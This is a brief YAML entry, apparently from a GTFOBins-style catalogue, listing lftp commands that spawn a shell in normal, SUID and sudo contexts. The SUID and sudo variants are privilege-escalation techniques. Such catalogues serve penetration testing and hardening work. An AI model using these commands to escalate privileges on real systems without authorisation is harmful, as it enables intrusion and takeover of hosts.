---
functions:
  shell:
    - code: lftp -c '!/bin/sh'
  suid:
    - code: ./lftp -c '!/bin/sh'
  sudo:
    - code: sudo lftp -c '!/bin/sh'
---
